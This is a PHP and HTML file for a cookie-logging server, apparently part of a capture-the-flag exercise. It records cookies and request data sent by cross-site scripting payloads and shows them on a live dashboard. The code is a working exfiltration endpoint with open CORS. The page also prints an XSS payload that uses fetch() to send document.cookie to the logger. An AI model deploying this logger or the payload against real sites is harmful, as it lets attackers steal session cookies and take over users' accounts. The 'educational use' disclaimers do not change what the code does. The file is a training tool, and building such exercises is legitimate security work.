<?php
/**
 * PTPetho CTF - Cookie Logger
 * This captures cookies sent via XSS attacks
 * For educational purposes only!
 */

// Allow CORS for XSS demo
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Get the stolen cookie or data
$cookie = $_GET['c'] ?? $_GET['cookie'] ?? $_POST['c'] ?? $_POST['cookie'] ?? '';
$data = $_GET['data'] ?? $_POST['data'] ?? '';

// Log file
$logFile = __DIR__ . '/captured.log';

// Get request info
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'unknown';
$requestUri = $_SERVER['REQUEST_URI'] ?? '';

// Log entry
$logEntry = "
================================================================================
[{$timestamp}] Cookie Captured!
================================================================================
IP Address:  {$ip}
User Agent:  {$userAgent}
Referer:     {$referer}
Request:     {$requestUri}
--------------------------------------------------------------------------------
COOKIE DATA: {$cookie}
EXTRA DATA:  {$data}
================================================================================

";

// Write to log file
file_put_contents($logFile, $logEntry, FILE_APPEND);

// Also output to console (for real-time viewing)
error_log("🍪 COOKIE CAPTURED: {$cookie}");

// Return success response
header('Content-Type: application/json');
echo json_encode([
    'status' => 'success',
    'message' => 'Data received',
    'timestamp' => $timestamp
]);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Logger | PTPetho CTF</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            min-height: 100vh;
            padding: 2rem;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        h1 {
            color: #00ff00;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 1rem;
            margin-bottom: 2rem;
        }
        .info {
            background: #1a1a1a;
            border: 1px solid #333;
            padding: 1.5rem;
            border-radius: 8px;
            margin-bottom: 2rem;
        }
        .log-viewer {
            background: #0d0d0d;
            border: 1px solid #00ff00;
            padding: 1.5rem;
            border-radius: 8px;
            max-height: 500px;
            overflow-y: auto;
        }
        .log-entry {
            border-bottom: 1px solid #333;
            padding: 1rem 0;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .log-entry:last-child {
            border-bottom: none;
        }
        .highlight {
            color: #ff6600;
            font-weight: bold;
        }
        .success {
            color: #00ff00;
        }
        .timestamp {
            color: #888;
        }
        code {
            background: #222;
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            color: #ff6600;
        }
        .status {
            display: inline-block;
            padding: 0.5rem 1rem;
            background: #003300;
            border: 1px solid #00ff00;
            border-radius: 4px;
            margin-bottom: 1rem;
        }
        .refresh-btn {
            background: #00ff00;
            color: #0a0a0a;
            border: none;
            padding: 0.75rem 1.5rem;
            font-family: inherit;
            font-size: 1rem;
            cursor: pointer;
            border-radius: 4px;
            margin-top: 1rem;
        }
        .refresh-btn:hover {
            background: #00cc00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🍪 Cookie Logger Server</h1>

        <div class="info">
            <div class="status">✅ Server Running</div>
            <p>This server captures cookies sent via XSS attacks.</p>
            <p style="margin-top: 1rem;">
                <strong>Endpoint URL:</strong><br>
                <code>http://<?= $_SERVER['HTTP_HOST'] ?>/log?c=COOKIE_DATA</code>
            </p>
            <p style="margin-top: 1rem;">
                <strong>XSS Payload Example:</strong><br>
                <code>&lt;img src=x onerror="fetch('http://<?= $_SERVER['HTTP_HOST'] ?>/log?c='+document.cookie)"&gt;</code>
            </p>
        </div>

        <h2 style="margin-bottom: 1rem;">📋 Captured Data</h2>
        <div class="log-viewer">
            <?php
            if (file_exists($logFile)) {
                $logs = file_get_contents($logFile);
                if (empty(trim($logs))) {
                    echo '<p class="timestamp">No cookies captured yet. Waiting for XSS payload to execute...</p>';
                } else {
                    echo '<pre>' . htmlspecialchars($logs) . '</pre>';
                }
            } else {
                echo '<p class="timestamp">No cookies captured yet. Waiting for XSS payload to execute...</p>';
            }
            ?>
        </div>

        <button class="refresh-btn" onclick="location.reload()">🔄 Refresh Logs</button>

        <div class="info" style="margin-top: 2rem;">
            <h3 style="color: #ff6600;">⚠️ Educational Use Only</h3>
            <p style="margin-top: 0.5rem;">
                This tool is for educational purposes in the PTPetho CTF challenge.
                Never use XSS attacks on real websites without authorization.
            </p>
        </div>
    </div>

    <script>
        // Auto-refresh every 5 seconds
        setTimeout(() => location.reload(), 5000);
    </script>
</body>
</html>
